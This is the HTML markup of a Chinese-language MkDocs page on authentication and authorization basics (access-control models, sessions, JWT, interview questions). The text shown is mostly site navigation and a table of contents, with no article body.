
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="系统性学习与技能提升的技术知识库，涵盖 Java、Spring、云原生等核心技术栈">
      
      
        <meta name="author" content="zhangzimingmmz">
      
      
        <link rel="canonical" href="https://blog.zhangziming.cn/auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/">
      
      
        <link rel="prev" href="../">
      
      
        <link rel="next" href="../02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/">
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>认证授权基础 - OpenTheDoor 技术知识库</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="blue">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#认证授权基础知识" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <div data-md-color-scheme="default" data-md-component="outdated" hidden>
        
      </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../.." title="OpenTheDoor 技术知识库" class="md-header__button md-logo" aria-label="OpenTheDoor 技术知识库" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            OpenTheDoor 技术知识库
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              认证授权基础
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="blue"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="blue"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/zhangzimingmmz/OpenTheDoor" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    zhangzimingmmz/OpenTheDoor
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
  
    
  
  首页

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../java-core/" class="md-tabs__link">
          
  
  
    
  
  Java核心技术

        </a>
      </li>
    
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../" class="md-tabs__link">
          
  
  
    
  
  认证授权

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../devops/" class="md-tabs__link">
          
  
  
    
  
  DevOps与工具

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../cloud-native/" class="md-tabs__link">
          
  
  
    
  
  云原生技术

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../middleware/" class="md-tabs__link">
          
  
  
    
  
  中间件技术

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../go/" class="md-tabs__link">
          
  
  
    
  
  Go语言系列

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="OpenTheDoor 技术知识库" class="md-nav__button md-logo" aria-label="OpenTheDoor 技术知识库" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    OpenTheDoor 技术知识库
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/zhangzimingmmz/OpenTheDoor" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    zhangzimingmmz/OpenTheDoor
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    首页
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../java-core/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    Java核心技术
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
        
        
      
      
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    认证授权
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    认证授权
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    认证授权基础
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    认证授权基础
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#目录" class="md-nav__link">
    <span class="md-ellipsis">
      
        目录
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#核心概念" class="md-nav__link">
    <span class="md-ellipsis">
      
        核心概念
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="核心概念">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#什么是认证authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        什么是认证（Authentication）？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#什么是授权authorization" class="md-nav__link">
    <span class="md-ellipsis">
      
        什么是授权（Authorization）？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1-访问控制列表acl---access-control-list" class="md-nav__link">
    <span class="md-ellipsis">
      
        1. 访问控制列表（ACL - Access Control List）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-基于角色的访问控制rbac---role-based-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      
        2. 基于角色的访问控制（RBAC - Role-Based Access Control）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-基于属性的访问控制abac---attribute-based-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      
        3. 基于属性的访问控制（ABAC - Attribute-Based Access Control）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-基于策略的访问控制pbac---policy-based-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      
        4. 基于策略的访问控制（PBAC - Policy-Based Access Control）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-其他授权模型" class="md-nav__link">
    <span class="md-ellipsis">
      
        5. 其他授权模型
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#授权模型对比" class="md-nav__link">
    <span class="md-ellipsis">
      
        授权模型对比
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#认证与授权的区别" class="md-nav__link">
    <span class="md-ellipsis">
      
        认证与授权的区别
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#会话管理" class="md-nav__link">
    <span class="md-ellipsis">
      
        会话管理
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="会话管理">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#为什么需要会话why-session" class="md-nav__link">
    <span class="md-ellipsis">
      
        为什么需要会话？（Why Session？）
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-基于服务器的会话session" class="md-nav__link">
    <span class="md-ellipsis">
      
        1. 基于服务器的会话（Session）
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="1. 基于服务器的会话（Session）">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#11-session核心概念what" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.1 Session核心概念（What）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#12-session工作原理how" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.2 Session工作原理（How）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#13-常见疑问未登录时是否生成sessiontoken" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.3 常见疑问：未登录时是否生成Session/Token？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#14-sessionid生成算法" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.4 SessionID生成算法
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#14-session存储方案" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.4 Session存储方案
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#15-分布式session解决方案" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.5 分布式Session解决方案
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#16-session安全最佳实践" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.6 Session安全最佳实践
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#17-session实际应用场景" class="md-nav__link">
    <span class="md-ellipsis">
      
        1.7 Session实际应用场景
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-jwtjson-web-token详解" class="md-nav__link">
    <span class="md-ellipsis">
      
        2. JWT（JSON Web Token）详解
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2. JWT（JSON Web Token）详解">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#21-jwt基础理论what--why" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.1 JWT基础理论（What &amp; Why）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#22-jwt结构详解structure" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.2 JWT结构详解（Structure）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#23-jwt工作流程workflow" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.3 JWT工作流程（Workflow）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#24-jwt签名算法详解" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.4 JWT签名算法详解
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#25-jwt安全性深入" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.5 JWT安全性深入
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#26-jwt最佳实践" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.6 JWT最佳实践
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#27-jwt在微服务中的应用" class="md-nav__link">
    <span class="md-ellipsis">
      
        2.7 JWT在微服务中的应用
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-session-vs-jwt-深度对比" class="md-nav__link">
    <span class="md-ellipsis">
      
        3. Session vs JWT 深度对比
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="3. Session vs JWT 深度对比">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#详细对比表" class="md-nav__link">
    <span class="md-ellipsis">
      
        详细对比表
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#场景选择指南" class="md-nav__link">
    <span class="md-ellipsis">
      
        场景选择指南
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-实际应用场景案例" class="md-nav__link">
    <span class="md-ellipsis">
      
        4. 实际应用场景案例
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="4. 实际应用场景案例">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#场景1单体web应用session方案" class="md-nav__link">
    <span class="md-ellipsis">
      
        场景1：单体Web应用（Session方案）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#场景2spa应用jwt方案" class="md-nav__link">
    <span class="md-ellipsis">
      
        场景2：SPA应用（JWT方案）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#场景3移动appjwt--refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      
        场景3：移动App（JWT + Refresh Token）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#场景4微服务架构jwt统一认证" class="md-nav__link">
    <span class="md-ellipsis">
      
        场景4：微服务架构（JWT统一认证）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#场景5混合方案session--jwt" class="md-nav__link">
    <span class="md-ellipsis">
      
        场景5：混合方案（Session + JWT）
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-常见面试题" class="md-nav__link">
    <span class="md-ellipsis">
      
        5. 常见面试题
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="5. 常见面试题">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#q1-session和token的区别" class="md-nav__link">
    <span class="md-ellipsis">
      
        Q1: Session和Token的区别？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#q2-jwt如何防止被篡改" class="md-nav__link">
    <span class="md-ellipsis">
      
        Q2: JWT如何防止被篡改？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#q3-jwt如何实现撤销revoke" class="md-nav__link">
    <span class="md-ellipsis">
      
        Q3: JWT如何实现撤销（Revoke）？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#q4-refresh-token的作用和实现原理" class="md-nav__link">
    <span class="md-ellipsis">
      
        Q4: Refresh Token的作用和实现原理？
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#q5-jwt应该存储在哪里为什么" class="md-nav__link">
    <span class="md-ellipsis">
      
        Q5: JWT应该存储在哪里？为什么？
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#总结" class="md-nav__link">
    <span class="md-ellipsis">
      
        总结
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="总结">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#session-vs-jwt-选择决策树" class="md-nav__link">
    <span class="md-ellipsis">
      
        Session vs JWT 选择决策树
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#最佳实践清单" class="md-nav__link">
    <span class="md-ellipsis">
      
        最佳实践清单
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#密码学基础" class="md-nav__link">
    <span class="md-ellipsis">
      
        密码学基础
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="密码学基础">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#哈希hash" class="md-nav__link">
    <span class="md-ellipsis">
      
        哈希（Hash）
      
    </span>
  </a>
  
